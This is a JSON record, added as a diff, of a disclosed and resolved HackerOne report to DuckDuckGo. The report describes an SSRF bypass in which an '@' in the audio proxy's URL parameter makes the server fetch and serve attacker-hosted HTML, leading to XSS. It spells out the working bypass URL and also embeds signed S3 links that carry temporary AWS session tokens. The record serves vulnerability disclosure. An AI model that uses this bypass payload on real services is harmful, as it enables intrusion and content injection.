@@ -1,0 +1,145 @@
+{
+  "id": 3522157,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTIyMTU3",
+  "url": "https://hackerone.com/reports/3522157",
+  "title": "SSRF with bypass leads to client side hosting / vulnerabilities ( XSS and others )",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-01-23T17:35:55.584Z",
+  "submitted_at": "2026-01-23T17:35:56.241Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ferreiraklet_",
+    "url": "/ferreiraklet_",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/yhl41iihi4lbxeeawt18qdcozixh/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 10995,
+    "url": "https://hackerone.com/duckduckgo",
+    "handle": "duckduckgo",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4mpaehke5u0ubioeqvys0hcesjle/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4mpaehke5u0ubioeqvys0hcesjle/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "DuckDuckGo",
+      "twitter_handle": "duckduckgo",
+      "website": "https://duckduckgo.com",
+      "about": "Independent online protection company. Get our mobile & desktop browser with protections built-in, including our search engine that doesn’t track you."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-09-17T22:54:11.953Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-08-18T22:54:09.213Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Summary\n\nHi team, your web app is vulnerable to SSRF.\n\n## Overview of the Vulnerability\nServer-side request forgery (SSRF) is a vulnerability that exploits the trust relationship between a server and an application, or other backend systems. An attacker can take advantage of this trust to forge server-side traffic and make HTTP requests to internal or external domains.\n\n## Business Impact\n\nSSRF can lead to data theft and through an attacker accessing, deleting, or modifying data from within the application via their access to server-side systems. This could also result in reputational damage for the business through the impact to customers’ trust. The severity of the impact to the business is dependent on the sensitivity of the data being stored in, and transmitted by the application.\n\n## Steps to Reproduce\n\n1. Enable a HTTP interception proxy, such as Burp Suite or OWASP ZAP\n2. Use a browser to login and navigate to: `https://start.duckduckgo.com/audio/?u=https:%2f%2faudio.wordnik.com%40raw.githubusercontent.com/ferreiraklet/xss-svg/refs/heads/main/index.html`\n3. See the server makes request to the url passed after @, fetchs it's resources and brings it to the website's front-end.\n\n```\nhttps://start.duckduckgo.com/audio/?u=https:%2f%2faudio.wordnik.com%40raw.githubusercontent.com/ferreiraklet/xss-svg/refs/heads/main/index.html\n``` \n\n4. Observe the sensitive response\n\n## Proof of Concept (PoC)\n\nThe screenshot below shows the full exploit:\n\n{F5266310}\n\n## Impact\n\nSSRF\n\nInteractsh ->\n{F5266319}",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5266310,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nvmocwmsq1hy42y5x4gfu4o6by35?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUX3JVU3L%2F20260918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260918T010050Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHAaCXVzLXdlc3QtMiJHMEUCIQDPkuoHFPC9zEjVcF87Cu%2FTH12WkWen%2BiR8VM%2B%2B9%2FKD2AIgDRw5e%2F07ZZzdC%2FaXt2NmE%2BMH4twe5WUcMovIeNwVX2UqsQUIORADGgwwMTM2MTkyNzQ4NDkiDNXiaE4xEooDMhkMSiqOBeXq6fkSkOWZoML9HKIvW1zvwKqr4LWri2yTMgVzFO7ucn3If%2FAbt7JonF5bbfR9LUAFk22paCFEmXDS1H1Rk3Iu2afu5DwdadGFZ1aDtmH%2B6v60mdfDd7Ub66l3glZJJcIjzedjj2tt7E8MxFX%2FVspb60vU3U41nJWdqoKRcjJsfHnUPF8ujgO%2F3Dscqzg6ZKo%2BFyF7cixwwaZOD9SC29CIfY3ISFAKouGKVQOwBL%2BgyhKT898MzcwwCCdxp30la%2F3AlR0ZaIW%2B9fYlqZtIOvlkK6MZAkLXTuSYtkUHUVhBIcz%2Fiv22g%2FboAFExE49tFuHT4LQqPGqxAuARf0rUqVVgWuEu9WyixnmxyRTWOs27K7Nha1H7HG%2Bwp2bwU69IWg5QYvm3CjLm%2BAyU3A6xwDMiPvCO%2B7K1K2FuLJ6h8ERnKns27k84ahZukHhqgIt1ylJ42UVpPND2jR%2BK84j4H%2BqGDEvW2FaE4E65Jf5OZ7UmRSx322P2sENnQeoPW5S7%2FD%2FDM62B9Yuzr7Le4dm6LNDWOUvNlfxt83m8KQx0ekOCR7uReQXyI50iP%2FHTlTjTqXVWIqNnBZzHCRXpejjJhbvfIRTaU0l%2BHNyPwq1mvIuSNwvrC1%2Fh5a1au53Y%2BxETxMzgp27ytn8AUkDZFc5cL4fYfFUae3tomy%2BCJJCTt6veiZNy6thwvI5equybalXriK1kfq4LgBZmgcALbDwzfAnNA2FsKhiRjek0Mf11vEHb4DAhQ35FXjoAtI77taacdJlKvTKfXDxhjQ624%2FEtVMxa%2FNLjt8wnKiniUSEXcJFXN8woTDqR6Aztp8u7u6bQhpb4K2IrNpqEjGGIK03dxoj3sHDiANlQfB%2F8An8nlTDtgrLVBjqxAazBX2Tyt%2BSBqWKkJY3qb5ksThK9D%2BenaFKkK%2BR%2BdAxUkZuPIossxTcJYsRnVdEmI2dQlkFjlBQ1u3ulXArzF5e%2FXdz4UHxpKc1TYmf2ccxNaeliI9nXzAOaR3Ao2xkZK0MQBkw5ZaYbYAhpdQX3dNrWOzwxk8zxxqThyxcNodjSTFnxwEUfyjLz2SM3e57%2B%2FbybFnoPUZc9EENH5ys%2FK9gmcSFKZcHnHQU7qQ%2BtgKdnDg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=15e393f7d4d4bef08646365be572800db6e97066848ce2ab6c4a40920db769fc",
+      "file_size": 52436,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5266319,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3e1xrjjoeatauagor2kjqsa6dwva?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUX3JVU3L%2F20260918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260918T010050Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHAaCXVzLXdlc3QtMiJHMEUCIQDPkuoHFPC9zEjVcF87Cu%2FTH12WkWen%2BiR8VM%2B%2B9%2FKD2AIgDRw5e%2F07ZZzdC%2FaXt2NmE%2BMH4twe5WUcMovIeNwVX2UqsQUIORADGgwwMTM2MTkyNzQ4NDkiDNXiaE4xEooDMhkMSiqOBeXq6fkSkOWZoML9HKIvW1zvwKqr4LWri2yTMgVzFO7ucn3If%2FAbt7JonF5bbfR9LUAFk22paCFEmXDS1H1Rk3Iu2afu5DwdadGFZ1aDtmH%2B6v60mdfDd7Ub66l3glZJJcIjzedjj2tt7E8MxFX%2FVspb60vU3U41nJWdqoKRcjJsfHnUPF8ujgO%2F3Dscqzg6ZKo%2BFyF7cixwwaZOD9SC29CIfY3ISFAKouGKVQOwBL%2BgyhKT898MzcwwCCdxp30la%2F3AlR0ZaIW%2B9fYlqZtIOvlkK6MZAkLXTuSYtkUHUVhBIcz%2Fiv22g%2FboAFExE49tFuHT4LQqPGqxAuARf0rUqVVgWuEu9WyixnmxyRTWOs27K7Nha1H7HG%2Bwp2bwU69IWg5QYvm3CjLm%2BAyU3A6xwDMiPvCO%2B7K1K2FuLJ6h8ERnKns27k84ahZukHhqgIt1ylJ42UVpPND2jR%2BK84j4H%2BqGDEvW2FaE4E65Jf5OZ7UmRSx322P2sENnQeoPW5S7%2FD%2FDM62B9Yuzr7Le4dm6LNDWOUvNlfxt83m8KQx0ekOCR7uReQXyI50iP%2FHTlTjTqXVWIqNnBZzHCRXpejjJhbvfIRTaU0l%2BHNyPwq1mvIuSNwvrC1%2Fh5a1au53Y%2BxETxMzgp27ytn8AUkDZFc5cL4fYfFUae3tomy%2BCJJCTt6veiZNy6thwvI5equybalXriK1kfq4LgBZmgcALbDwzfAnNA2FsKhiRjek0Mf11vEHb4DAhQ35FXjoAtI77taacdJlKvTKfXDxhjQ624%2FEtVMxa%2FNLjt8wnKiniUSEXcJFXN8woTDqR6Aztp8u7u6bQhpb4K2IrNpqEjGGIK03dxoj3sHDiANlQfB%2F8An8nlTDtgrLVBjqxAazBX2Tyt%2BSBqWKkJY3qb5ksThK9D%2BenaFKkK%2BR%2BdAxUkZuPIossxTcJYsRnVdEmI2dQlkFjlBQ1u3ulXArzF5e%2FXdz4UHxpKc1TYmf2ccxNaeliI9nXzAOaR3Ao2xkZK0MQBkw5ZaYbYAhpdQX3dNrWOzwxk8zxxqThyxcNodjSTFnxwEUfyjLz2SM3e57%2B%2FbybFnoPUZc9EENH5ys%2FK9gmcSFKZcHnHQU7qQ%2BtgKdnDg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e8e4277d7ce08f5fd1e6241b242a03f98e9fa4adb69ee35ab1875dbd1fb73194",
+      "file_size": 88980,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-09-17T22:54:09.720Z",
+  "allow_singular_disclosure_after": -7600.434890189,
+  "singular_disclosure_allowed": true,
+  "vote_count": 1,
+  "voters": [
+    "active_war"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 8671,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.duckduckgo.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
